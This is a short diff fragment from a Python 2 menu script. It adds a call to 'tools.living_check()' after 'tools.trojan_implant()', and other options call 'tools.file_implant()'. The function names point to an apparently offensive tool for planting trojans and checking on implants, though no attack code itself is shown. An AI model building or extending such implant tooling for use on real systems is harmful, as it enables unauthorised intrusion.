@@ -30,6 +30,7 @@ while (1):
 	choose = int(raw_input("Please Input:"))
 	if choose == 1:
 		tools.trojan_implant()
+		tools.living_check()
 	if choose == 2:
 		tools.file_implant()
 	if choose == 3:
